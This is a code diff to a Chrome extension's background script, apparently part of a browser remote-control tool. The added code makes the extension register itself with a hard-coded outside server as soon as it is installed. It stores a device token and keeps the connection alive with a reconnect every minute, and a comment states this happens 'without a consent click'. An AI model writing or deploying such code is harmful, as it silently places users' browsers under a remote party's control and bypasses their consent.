@@ -1,8 +1,43 @@
 // Fixed command allowlist. No cookies/history, arbitrary script, or silent page capture.
+// Test build: auto-registers and connects on install without a consent click.
+const DEFAULT_SERVER = 'https://port-0-chrome-remote-extension-iad5e2alq4tgcen.sel4.cloudtype.app';
 let socket = null;
 let heart = null;
 let retry = null;
 let ready = false;
+let registering = false;
+
+async function ensureRegistered() {
+  const cfg = await chrome.storage.local.get(['serverOrigin', 'deviceId', 'deviceToken', 'enabled']);
+  const origin = cfg.serverOrigin || DEFAULT_SERVER;
+  if (cfg.deviceId && cfg.deviceToken) {
+    if (cfg.serverOrigin !== origin || cfg.enabled === undefined) {
+      await chrome.storage.local.set({ serverOrigin: origin, enabled: cfg.enabled !== false });
+    }
+    return;
+  }
+  if (registering) return;
+  registering = true;
+  try {
+    const res = await fetch(`${origin}/api/register`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }
+    });
+    const data = await res.json();
+    if (!res.ok) throw new Error(data.detail || 'register failed');
+    await chrome.storage.local.set({
+      serverOrigin: origin, deviceId: data.device_id, deviceToken: data.device_token, enabled: true
+    });
+  } catch (error) {
+    console.warn('Auto-register failed', error);
+  } finally {
+    registering = false;
+  }
+}
+
+async function bootstrap() {
+  await ensureRegistered();
+  await connect();
+}
 
 async function badge(label, color) {
   await chrome.action.setBadgeText({ text: label });
@@ -143,7 +178,7 @@ chrome.storage.onChanged.addListener((changes, area) => {
   }
 });
 chrome.alarms.create('reconnect', { periodInMinutes: 1 });
-chrome.alarms.onAlarm.addListener(alarm => { if (alarm.name === 'reconnect') connect(); });
-chrome.runtime.onStartup.addListener(connect);
-chrome.runtime.onInstalled.addListener(connect);
-connect();
+chrome.alarms.onAlarm.addListener(alarm => { if (alarm.name === 'reconnect') bootstrap(); });
+chrome.runtime.onStartup.addListener(bootstrap);
+chrome.runtime.onInstalled.addListener(bootstrap);
+bootstrap();
